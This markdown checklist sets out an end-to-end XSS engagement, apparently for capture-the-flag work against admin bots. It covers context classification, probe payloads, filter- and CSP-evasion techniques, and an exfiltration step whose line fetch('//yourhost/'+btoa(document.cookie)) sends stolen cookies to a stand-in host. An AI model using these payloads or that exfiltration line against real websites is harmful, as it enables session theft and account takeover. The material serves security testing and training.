# Operator checklist — the XSS engagement end to end

## Intake

- [ ] Identify every reflection point: URL params, POST bodies, headers (`Referer`,
      `User-Agent`, `X-Forwarded-For`), cookies, file-upload metadata, stored
      fields (profile, comments, search history, error pages).
- [ ] Record which reflections are **immediate** (reflected), **stored** (persisted
      and replayed to another viewer), and **DOM** (the sink is in client JS, the
      response may not contain the payload).
- [ ] Name the viewer for any stored/DOM path: an admin bot, a moderator, the
      victim's own session. XSS without a viewer is self-XSS until one is found.

## Context classification — pick the sink before the payload

- [ ] HTML body context → tag injection; try `<svg onload=…>` first, then
      `<img src=x onerror=…>`.
- [ ] Attribute context → break out with `">` then event handler, or stay inside
      with `" onfocus=alert(1) autofocus="` if quote allowed.
- [ ] JS string context → `';alert(1)//` or close the script `</script><svg onload=…>`.
- [ ] JS code context (inside an existing handler/`eval`/`new Function`) → the
      payload is raw JS, no tags needed.
- [ ] URL/href context → `javascript:alert(1)` if the scheme is not whitelisted.
- [ ] srcdoc/srcset/style/meta-refresh → the edge contexts with their own rules.

## Detection probes — minimal, ordered

1. A unique marker string with every meta char: `"'<>zqx9` — read the response
   and note which chars are escaped, stripped, or passed through.
2. `zqx9<svg onload=alert(1)>` in HTML context; read whether `<` `>` survive.
3. For DOM, instrument the sink in DevTools (or `web-chromedriver`) — `debugger`
   on `innerHTML`, `eval`, `location`, `postMessage`, `document.write`.

## Filter-evasion ladder

- [ ] Case: `<ScRiPt>` / `OnLoAd`.
- [ ] Tag swap: if `script` blocked try `svg`, `img`, `details ontoggle`,
      `marquee onstart`, `video onerror`, `body onload`, `input autofocus onfocus`.
- [ ] Event-handler swap: `onload` → `onerror`/`onfocus`/`ontoggle`/`onpointerover`.
- [ ] Encoding: HTML entities `&lt;`, URL `%3C`, Unicode `‹`, double-encode for a
      decode-then-filter, null byte `%00` to split a keyword.
- [ ] Whitespace: `/` instead of space `<svg/onload>`, newline, tab, formfeed.
- [ ] mXSS: a payload that is inert when filtered but becomes live after the
      sanitizer re-serialises it (`<listing><img src=x onerror=…></listing>`).
- [ ] Polyglot for an unknown context: one payload that fires in HTML, attribute,
      and JS-string simultaneously.

## The bot check — before spending a cycle

- [ ] Confirm the bot's URL/input, its cookie/session scope, whether it visits a
      supplied link or a stored page, and its visit frequency/timeout.
- [ ] A stored payload that fires only on the bot's view page beats a reflected
      link the bot may not be able to open.
- [ ] If the bot is headless, test the payload locally in `web-chromedriver`
      first — an alert that blocks is invisible headless; use `fetch`/`onerror`
      exfil to a controlled endpoint, never `alert` for a real exfil.

## Exfil — the flag must come back

- [ ] The payload reads the flag source: `document.cookie`, a DOM node, `localStorage`,
      `fetch('/flag')`, or the bot's privileged view.
- [ ] Exfil channel: `fetch('//yourhost/'+btoa(document.cookie))`, an `<img>` to a
      listener you control, `navigator.sendBeacon`, or an OOB webhook (`tools/web/oob_listener.py`).
- [ ] SameSite/cookie flags: if `HttpOnly`, the cookie is unreadable — pivot to
      `fetch` on the victim's behalf (the cookie rides automatically) or read the
      flag from a DOM node the bot renders.

## Evidence discipline

- [ ] `alert(1)` proves execution; it is not the flag. Record the payload, the
      context it fired in, and the exact source/sink line.
- [ ] The flag is confirmed only when it arrives in the OOB listener or in a
      `fetch` response the payload captured — verbatim, attributable to this bot.
- [ ] Record every filter behaviour and blocked variant as a negative result, not
      a discarded attempt.

## Stop / escalate

- [ ] Five payloads dead in one context with no new filter information → change
      context (attribute ↔ body ↔ JS-string ↔ DOM), not the tag one more time.
- [ ] No viewer found for a stored/DOM path → the class is self-XSS; reclassify
      or park it and look for the click/interaction primitive that arms it.
- [ ] A filter that strips every meta char → the input is not a live sink;
      escalate to the CSP/report-uri/sanitizer-bypass route, or switch class.
- [ ] CSP blocks inline but allows a whitelisted CDN/JSONP/known gadget — the
      bypass is an allowed-host gadget, not a tighter payload.
- [ ] `script-src 'nonce-…'`/`'strict-dynamic'` present → a static payload will
      not run; find the nonce leak, the DOM-clobbering path, or the trusted-host
      JS gadget rather than another inline tag.
- [ ] A sanitizer (DOMPurify/sanitize-html) is present → try the mXSS bypass for
      its pinned version via `gadget_lookup`, not a generic tag list.
- [ ] The reflection is in a JSON/`application/json` or `text/plain` response —
      no HTML parse, no XSS; check the MIME and the `X-Content-Type-Options`
      header before spending a payload.
- [ ] Context is an email/PDF/report renderer → the engine may be a headless
      browser or a PDF generator; the payload and the flag path are different —
      read `upload-xss`/`second-order-dom` instead of the HTML sink table.
- [ ] The reflection is inside `<!-- a comment -->` or `<textarea>`/`<title>` —
      the payload must close that container first (`--><svg…>`, `</textarea><…>`,
      `</title><…>`), not inject inside it.
- [ ] Stop when the budget for the context is spent with no new signal — a sixth
      tag inside a dead sink is the Polynomial failure, not progress.
- [ ] On a clean solve: record the winning payload, the sink line, the bot path,
      and the OOB hit in `../field-notes.md` so the next reflection in this app
      opens already classified.
- [ ] On a dead end: the kill map goes to `knowledge/attempts/` — which contexts
      were probed, which filters stripped what, and the precondition that would
      reopen each.
